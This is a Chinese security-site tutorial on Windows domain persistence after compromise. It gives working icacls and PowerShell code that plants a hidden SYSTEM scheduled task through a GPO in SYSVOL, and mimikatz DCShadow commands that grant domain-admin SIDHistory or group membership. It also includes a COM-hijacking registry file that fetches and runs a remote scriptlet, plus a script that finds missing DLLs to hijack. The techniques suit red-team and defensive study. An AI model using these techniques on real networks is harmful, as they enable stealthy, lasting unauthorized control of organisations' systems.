# Windows 下的权限维持

阅读量 **404012**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-02-28 14:30:26

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 0x00 前言

在完成一个前期的渗透测试，获取到最高权限过后，后面最主要的任务就是，对目标的权限维持，方便对目标的持续性控制。本文就简单介绍几种常用的权限维持的方法。

## 0x01 GPO

​ **GPO介绍：** 组策略保存为组策略对象（GPO），然后将其与Active
Directory对象（如站点，域或组织单位（OU））相关联。组策略可以包括安全选项，注册表项，软件安装，启动和关闭脚本以及域成员刷新组策略设置（默认情况下每隔90分钟一次）（域控制器为5分钟）。这意味着组策略在目标计算机上强制执行配置的设置。在大多数Active
Directory实现中，在域上至少配置了一个GPO，用于定义强制密码，Kerberos和域范围策略;至少一个为域控制器OU配置的GPO;至少为服务器和工作站OU配置了一个GPO。这两个GPO的名称都一样，但是ObjectID是不一样的。

![](https://p1.ssl.qhimg.com/t01b53076d4bb3ababe.png)

所以我们可以给一个普通域用户赋予DC的sysvol完全控制权限，修改文件做到命令执行的效果，以此来达到权限维持。

先给普通用户加给权限：

    
    
    icacls C:WindowsSYSVOLsysvolhack.com /grant lemo:"(OI)(CI)(F)" /t
    

![](https://p1.ssl.qhimg.com/t0199ed5378b34f960f.png)

我这里使用powershell把文件复制到上面，使用默认有的domain policy，修改ScheduledTasks.xml是不会执行的：

![](https://p2.ssl.qhimg.com/t011033b208e4e9638f.png)

假设原来域中就有执行计划任务的GPO（这里可以使用powerview里面的[New-GPOImmediateTask](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907)来创建），我们再来修改这个文件，重启或者等90分钟就可以执行其中的计划任务命令了：

![](https://p4.ssl.qhimg.com/t018f4b5fb5973d2882.png)

![](https://p2.ssl.qhimg.com/t012921ee873edc1d95.png)

powershell代码：

    
    
    <#
    icacls C:WindowsSYSVOLsysvoltest.com /grant test1:"(OI)(CI)(F)" /t
    icacls C:WindowsSYSVOLsysvoltest.com /remove test1 /t
    #>
    
    function Set-ScheduleXml{
            [CmdletBinding()]
    
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            [ValidateNotNullOrEmpty()]
            $GpoTaskXMLPath,
    
            [String]
            [ValidateNotNullOrEmpty()]
            $Cmd
        )
    
        $schedulexml = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"><ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="Debugging" image="0" changed="2019-01-20 06:02:04" uid="{9ccbe17e-5c25-4c68-a010-93f0420512ba}" userContext="0" removePolicy="0"><Properties action="C" name="Debugging" runAs="NT AUTHORITYSystem" logonType="InteractiveToken"><Task version="1.3"><RegistrationInfo><Author>NT AUTHORITYSystem</Author><Description></Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITYSystem</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>InteractiveToken</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>powershell</Command><Arguments>-c "powershellcmd"</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
        $schedulexml = $schedulexml.Replace('powershellcmd', $cmd)
    
        $TaskXMLPath = $GpoTaskXMLPath + '/ScheduledTasks.xml'  
        $schedulexml | Set-Content -Encoding ASCII -Path $TaskXMLPath
    }
    
     Set-ScheduleXml -GpoTaskXMLPath '\hackdcSYSVOLhack.comPolicies{595D4D1F-5018-413D-8177-DE7089C40117}UserPreferencesScheduledTasks' -Cmd 'ipconfig /all|out-file c:tempnew.txt'
    

## 0x02 用户对象属性

通过修改dcshadow的方式修改SIDHistory，所控制的windows必须关闭防火墙:

    
    
    lsadump::dcshadow /object:lemo /attribute:sidhistory /value:S-1-5-21-1863527717-1245757989-2975568438-500
    lsadump::dcshadow /push
    

![](https://p5.ssl.qhimg.com/t014aa1bcb5650022c2.png)

修改之后的lemo用户属性：

![](https://p4.ssl.qhimg.com/t0137aec3c610c8039e.png)

Primarygroupid:

    
    
    先移除sidhistory:
    Set-ADUser -Identity lemo -Remove @{SIDHistory='S-1-5-21-1863527717-1245757989-2975568438-500'}
    lsadump::dcshadow /object:lemo /attribute:primarygroupid /value:512
    lsadump::dcshadow /push
    

![](https://p5.ssl.qhimg.com/t01e30c6ca314afca6c.png)

## 0x03 COM劫持

什么是COM对象：COM（组件对象模型）被Microsoft描述为“独立于平台，分布式，面向对象的系统，用于创建可以交互的二进制组件”。
该技术的目的是提供一个接口，允许开发人员控制和操纵其他应用程序的对象。 每个COM对象都由一个名为CLSID的唯一ID定义。 例如，用于创建Internet
Explorer实例的CLSID是{0002DF01-0000-0000-C000-000000000046}。大多数COM类都在操作系统中注册，并由表示注册表中的类标识符（CLSID）的GUID标识（通常在HKCR
CLSID或HKCU Software Classes CLSID，HKLMSOFTWAREClassesCLSID下）。

列出当前所有的COM对象：

![](https://p0.ssl.qhimg.com/t01965f6ef3c45c1754.png)

这里还有各种系统的常见COM对象：

    
    
    https://github.com/ohpe/juicy-potato/tree/master/CLSID
    

关于clsid中键值的意义：`http://www.cnblogs.com/developersupport/archive/2013/06/02/COM-registry.html`

在COM类的实现背后是在CLSID下的注册表项中LocalServer32键表示可执行（exe）文件的路径，InprocServer32键表示动态链接库（DLL）文件的路径，并且HKCU中的CLSID值优先于HKLM中的CLSID。所以利用下面这个[reg文件](https://github.com/api0cradle/LOLBAS/blob/master/OSScripts/Payload/Slmgr.reg)注册一个COM对象：

    
    
    Windows Registry Editor Version 5.00
    
    [HKEY_CURRENT_USERSoftwareClassesScripting.Dictionary]
    @=""
    
    [HKEY_CURRENT_USERSoftwareClassesScripting.DictionaryCLSID]
    @="{00000001-0000-0000-0000-0000FEEDACDC}"
    
    
    [HKEY_CURRENT_USERSoftwareClassesCLSID{00000001-0000-0000-0000-0000FEEDACDC}]
    @="Scripting.Dictionary"
    
    [HKEY_CURRENT_USERSoftwareClassesCLSID{00000001-0000-0000-0000-0000FEEDACDC}InprocServer32]
    @="C:\WINDOWS\system32\scrobj.dll"
    "ThreadingModel"="Apartment"
    
    [HKEY_CURRENT_USERSoftwareClassesCLSID{00000001-0000-0000-0000-0000FEEDACDC}ProgID]
    @="Scripting.Dictionary"
    
    [HKEY_CURRENT_USERSoftwareClassesCLSID{00000001-0000-0000-0000-0000FEEDACDC}ScriptletURL]
    @="https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSScripts/Payload/Slmgr_calc.sct"
    
    [HKEY_CURRENT_USERSoftwareClassesCLSID{00000001-0000-0000-0000-0000FEEDACDC}VersionIndependentProgID]
    @="Scripting.Dictionary"
    

![](https://p5.ssl.qhimg.com/t01caa24e9a8e4e19e4.gif)

实际渗透中可以自己创建一个COM对象，但一般都是寻找到机器上一个可用的COM对象或者直接修改已有的对象。然后找到一个COM调用的DLL文件是不存在的，然后放入自己的DLL文件，每次调用那个COM时，你的DLL就会执行。判断文件是否存在：

    
    
    $inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }
    $LocalServer32paths = $inproc | ForEach {$_.LocalServer32} 
    foreach ($p in $LocalServer32paths){$p;cmd /c dir $p > $null}
    
    $InprocServer32paths = $inproc | ForEach {$_.InprocServer32}
    foreach ($pi in $InprocServer32paths){$pi;cmd /c dir $pi > $null}
    

COM组件也用来做其他的事比如UAC的绕过等，可以看三好学生的[Use-COM-objects-to-bypass-UAC](https://github.com/3gstudent/Use-COM-objects-to-bypass-UAC)
。或者是使用windows的库文件：[Abusing Windows Library Files for
Persistence](https://www.countercept.com/blog/abusing-windows-library-files-for-persistence/)
。[第一百一十三课：COM%20Hijacking.pdf](https://github.com/Micropoor/Micro8/blob/master/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%9ACOM%20Hijacking.pdf)

## 0x04 总结

​
还有一些方法就没有介绍了，例如黄金票据和白银票据，修改注册表，GPO的ACL等，本文就只是大致介绍几种方法，没有介绍关于利用安装的应用程序，例如exchange,office等软件这些的权限维持方法，或者关于域下的方法，利用约束性委派，修改DACL的方式等。当然权限维持的目标都是利用白名单，尽量少被记录日志。可以再推荐大家看下hexacorn的[how-to-find-new-persistence-tricks](http://www.hexacorn.com/blog/2018/10/14/how-to-find-new-persistence-tricks/)，[beyond-good-ol-run-key-part-32](http://www.hexacorn.com/blog/2015/09/12/beyond-good-ol-run-key-part-32/)，[beyond-good-ol-run-key-part-28](http://www.hexacorn.com/blog/2015/02/23/beyond-good-ol-run-key-part-28/)。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **anw2** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/171528](/post/id/171528)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Windows](/tag/Windows)
  * [系统安全](/tag/系统安全)
  * [COM](/tag/COM)
  * [clsid](/tag/clsid)

 **+1** __8赞

 __收藏

![](https://p0.ssl.qhimg.com/t010857340ce46bb672.jpg) anw2

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

